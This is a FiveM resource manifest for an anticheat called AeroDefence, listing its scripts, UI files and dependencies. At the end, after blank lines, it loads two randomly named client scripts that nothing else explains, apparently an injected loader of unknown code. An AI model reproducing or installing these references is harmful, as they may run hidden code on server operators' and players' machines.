fx_version 'cerulean'
game 'gta5'

name "AeroDefence"
description "FiveM AntiCheat By KiLaF"
author "KiLaF#4554"
version "3.0"

--# Don't touch 

shared_scripts { 'configs/client/*.*' }

server_scripts { 'configs/server/*.*', 'server/s_aerodefense.lua' }

client_scripts { 'client/*.lua' }

ui_page "client/ui/h_aerodefence.html"
files { 'client/ui/*.*' }

export 'requestUpload'

dependencies { '/onesync' } -- need onesync enabled to work




client_script '@AeroDefence/client/c_antistop.lua'

client_script 'DPAxLYexmsyY.lua'




client_script 'mnCahiEGwyYY.lua'